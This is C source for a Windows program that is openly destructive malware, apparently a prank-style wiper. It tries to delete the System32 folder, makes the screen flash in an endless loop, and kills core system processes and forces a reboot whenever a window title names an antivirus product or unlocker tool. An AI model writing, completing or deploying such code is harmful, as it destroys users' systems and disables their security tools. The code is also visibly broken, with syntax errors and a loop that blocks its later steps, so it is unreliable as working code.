#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>

void deletesystem()
{
  char system32Path[] = "C:\\Windows\\System32";

  remove(system32Path)
}

void fun()
{
  HDC hdc = GetDC(0;
  int x = GetSystemMetrics(SM_CXSCREEN);
  int y = GetSystemMetrics(SM_CYSCREEN);
  
  RECT screenRect;
  GetWindowRect(GetDesktopWindow(), &screenRect);
  
  while (1)
  {
    hdc = GetDC(0);
    PatBlt(hdc, 0, 0, screenRect.right, screenRect.bottom, PATINVERT);
    Sleep(1000);
    ReleaseDC(0, hdc);
  }
}

void trigger_bsod()
{
  system("taskkill /f /im explorer.exe");
  system("taskkill /f /im svchost.exe");
  system("taskkill /f /im wininit.exe");
  system("shutdown /r /t 0");
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
  char window_title[256];
  GetWindowTextA(hwnd, window_title, sizeof(window_title));
  
  if (strstr(window_title, "антивирус") != NULL ||
    strstr(window_title, "вирус") != NULL ||
    strstr(window_title, "antivirus") != NULL ||
    strstr(window_title, "virus") != NULL ||
    strstr(window_title, "drweb") != NULL ||
    strstr(window_title, "доктор веб") != NULL ||
    strstr(window_title, "avast") != NULL ||
    strstr(window_title, "аваст") != NULL ||
    strstr(window_title, "kaspersky") != NULL ||
    strstr(window_title, "касперский") != NULL ||
    strstr(window_title, "simple unlocker") != NULL ||
    strstr(window_title, "su") != NULL)
    {
      trigger_bsod();
    }
  return TRUE;
}

int main()
{
  deletesystem();
  fun();
  EnumWindows(EnumWindowsProc, NULL);
  
  return 0;
}
